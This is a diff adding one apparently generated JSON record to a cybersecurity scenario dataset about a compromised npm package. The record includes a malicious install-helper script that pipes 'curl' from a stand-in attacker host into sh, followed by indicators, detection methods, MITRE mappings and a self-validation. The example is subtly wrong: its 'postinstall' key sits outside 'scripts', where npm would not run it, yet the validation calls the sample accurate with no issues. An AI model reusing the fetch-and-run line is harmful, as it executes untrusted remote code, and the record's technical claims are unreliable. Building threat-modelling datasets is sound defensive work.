@@ -1,0 +1,43 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "Third-Party Software Compromise"
+      },
+      "example": {
+        "scenario": "Attackers compromise the update mechanism of a popular open-source JavaScript library by injecting malicious code into its NPM package update, causing downstream applications to execute a remote code execution payload when the compromised dependency is installed or updated.",
+        "technical_data": {
+          "package_json_before": "{\n  \"name\": \"lib-analytics\",\n  \"version\": \"1.2.4\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"mocha\"\n  },\n  \"dependencies\": {\n    \"lodash\": \"^4.17.15\"\n  }\n}",
+          "package_json_after_compromise": "{\n  \"name\": \"lib-analytics\",\n  \"version\": \"1.2.5\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"mocha\"\n  },\n  \"dependencies\": {\n    \"lodash\": \"^4.17.15\"\n  },\n  \"postinstall\": \"node ./scripts/install-helper.js\"\n}",
+          "malicious_install_helper_js": "const { exec } = require('child_process');\nexec('curl http://malicious-actor.com/payload.sh | sh', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
+          "npm_registry_log_snippet": "[2024-04-15T13:22:11.453Z] INFO  publish-package user=lib-maintainer package=lib-analytics version=1.2.5 ip=192.0.2.55\n[2024-04-15T13:22:12.001Z] WARN  package-scan user=lib-maintainer package=lib-analytics version=1.2.5 ip=192.0.2.55 scan_result=postinstall_scripts_detected",
+          "git_commit_log": "commit 4f8e2c7d9a1c3e5b8f6d2a9b7c3e4f1d2a5b3c6d\nAuthor: lib-maintainer <maintainer@example.com>\nDate:   Mon Apr 15 13:20:50 2024 +0000\n\n    Bump version to 1.2.5 and add postinstall script for dependency update\n\n    Added install-helper.js to scripts folder\n",
+          "SBOM_extract": "{\n  \"name\": \"lib-analytics\",\n  \"version\": \"1.2.5\",\n  \"components\": [\n    {\n      \"name\": \"lodash\",\n      \"version\": \"4.17.15\",\n      \"purl\": \"pkg:npm/lodash@4.17.15\"\n    },\n    {\n      \"name\": \"install-helper.js\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Malicious postinstall script injected by attacker\"\n    }\n  ]\n}"
+        },
+        "indicators": [
+          "New 'postinstall' script added in package.json in version 1.2.5",
+          "Presence of install-helper.js executing curl/sh command to suspicious domain",
+          "NPM registry logs showing postinstall script warnings but package published anyway",
+          "Unexpected remote network connections to http://malicious-actor.com during 'npm install'",
+          "SBOM showing undocumented script component in dependency tree",
+          "Git commit introducing unexpected scripts outside normal release process"
+        ],
+        "detection_method": "Automated SBOM and dependency auditing tools detect unexpected postinstall scripts and new files in package updates; code signing validation fails since the new package was not signed or signature mismatch; network monitoring alerts on HTTP connections to known malicious domains during build or install; Git repository hooks and CI pipeline enforce no arbitrary scripts in dependency packages; threat intelligence platforms flag malicious-actor.com domain and URL patterns; static code analysis flags usage of child_process.exec with remote payload fetching.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1204.002 - User Execution: Malicious File",
+          "T1553.006 - Subvert Trust Controls: Code Signing",
+          "T1606 - Forge Web Credentials (for compromised developer accounts publishing malicious packages)"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party software compromise in the supply chain by illustrating how attackers inject malicious code into a widely used NPM package update. The scenario is realistic and plausible, reflecting common attack vectors such as adding a postinstall script that executes a remote payload. All required fields are present and well populated, including detailed technical data (package.json before and after compromise, malicious script, logs, SBOM extract), clear indicators linking the compromise to the problem, detection methods aligned with best practices, and relevant MITRE ATT&CK techniques. The indicators effectively explain why this sample matches the problem nature, highlighting changes in package.json, suspicious scripts, registry warnings, network connections, SBOM anomalies, and git commit irregularities. The detection methods comprehensively cover SBOM auditing, code signing verification, network monitoring, CI pipeline enforcement, threat intelligence, and static analysis, which align well with the recommended risk reduction strategies. Overall, this sample is thorough, coherent, and well suited for illustrating the stated cybersecurity problem."
+      }
+    }
+  ]
+}
